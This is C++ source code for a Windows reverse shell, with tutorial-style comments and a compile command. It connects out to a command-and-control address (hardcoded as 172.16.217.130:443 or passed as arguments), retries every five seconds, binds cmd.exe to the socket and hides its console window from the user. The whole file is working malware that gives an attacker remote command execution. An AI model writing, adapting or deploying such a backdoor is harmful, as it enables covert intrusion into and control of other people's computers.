//Compile with g++/i686-w64-mingw32-g++ <filename>.cpp -o <filname>.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

#include <winsock2.h>	//windows socket communications over TCP/IP
#include <windows.h>	//required for calling other processes, initiating other headers and calls
#include <ws2tcpip.h>	//windows socket communications over TCP/IP
#pragma comment(lib, "Ws2_32.lib") //inform the compiler to statically compile this library into the executable. Without this, our executable wonít run in any machine unless they have Microsoft Visual C/C++ redistributable installed in their system
#define DEFAULT_BUFLEN 1024  //buffer length for our socketís recv and send function in a variable and give it a constant size of 1024 bytes.


void RunShell(char* C2Server, int C2Port) {
    while(true) {
		Sleep(5000); //wait 5 seconds
        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
        addr.sin_port = htons(C2Port);     //Port received from main function

        //Connecting to Proxy/ProxyIP/C2Host
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo; //contains details as to what all things should be taken care of before the process starts
                PROCESS_INFORMATION pinfo; //contains details about the new process,parent process, its child process, other threads and how it will function
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket; //typecasting mySocket to a HANDLE, and passing all the input(hStdInput), output(hStdOuput), error(hStdError) of STARTUPINFO struct
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo); //CreateProcess API which creates a cmd.exe process using the above variable and pipes the input, output and error to the HANDLE using &sinfo created above
                //This sinfo will send all the data over socket to our C2Server and we can view all the errors and output of commands we execute in the cmd process.
				WaitForSingleObject(pinfo.hProcess, INFINITE); //wait for this child process i.e. cmd.exe to finish and close the process handles
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0); //I will again wait for buffer to be received over the network. If I receive a string containing ìexit\nî, it will exit our socket program, else will continue with the while loop.
                }
            }
        }
    }
}


int main(int argc, char **argv) {
    FreeConsole(); //function to disable the console window so that it is not visible to the user
    if (argc == 3) {
        int port  = atoi(argv[2]); //Converting port in Char datatype to Integer format
        RunShell(argv[1], port);
    }
    else {
        char host[] = "172.16.217.130";
        int port = 443;
        RunShell(host, port);
    }
    return 0;
}
